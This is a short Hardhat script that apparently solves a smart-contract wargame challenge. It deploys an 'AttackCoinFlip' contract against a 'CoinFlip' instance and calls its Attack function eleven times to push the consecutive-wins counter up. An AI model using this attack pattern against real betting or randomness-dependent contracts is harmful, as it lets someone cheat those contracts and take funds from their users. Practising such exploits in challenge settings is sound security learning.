const hre = require("hardhat");

async function main() {
  const CoinFlipContract = await hre.ethers.getContractFactory("CoinFlip");
  // attach your instance address
  const CoinFlip = CoinFlipContract.attach(
    "0x0Ab214A3abDD4F146bA1a4CA561B5D917417C0f0"
  );
  const consecutiveCount = await CoinFlip.consecutiveWins();
  console.log(`consecutiveWins -->  ${consecutiveCount}`);
  const AttackContract = await ethers.getContractFactory("AttackCoinFlip");
  const Attack = await AttackContract.deploy(
    "0x0Ab214A3abDD4F146bA1a4CA561B5D917417C0f0"
  );
  await Attack.deployed();
  console.log("Attacking...");
  for (let i = 0; i < 11; i++) {
    const tx = await Attack.Attack();
    await tx.wait(1);
  }
  const updatedConsecutiveCount = await CoinFlip.consecutiveWins();
  console.log(`consecutiveWins -->  ${updatedConsecutiveCount}`);
}

main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
